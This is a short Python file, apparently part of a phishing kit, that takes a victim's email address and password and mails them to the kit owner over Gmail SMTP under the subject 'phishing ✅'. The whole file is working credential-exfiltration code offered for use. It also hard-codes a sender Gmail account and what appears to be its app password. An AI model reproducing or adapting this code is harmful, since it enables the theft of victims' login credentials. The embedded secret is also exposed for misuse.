import smtplib
import email.message

def enviar_email(dono,emaik, password):  
    corpo_email = f"""
    <p>email : {emaik} </p>
    <p>password: {password}</p>
    """

    msg = email.message.Message()
    msg['Subject'] = "phishing ✅"
    msg['From'] = 'euprofreefire@gmail.com'
    msg['To'] = dono
    password = 'pzqushcxyozzexmy' 
    msg.add_header('Content-Type', 'text/html')
    msg.set_payload(corpo_email )

    s = smtplib.SMTP('smtp.gmail.com: 587')
    s.starttls()
    # Login Credentials for sending the mail
    s.login(msg['From'], password)
    s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
    print('check your email 📩')
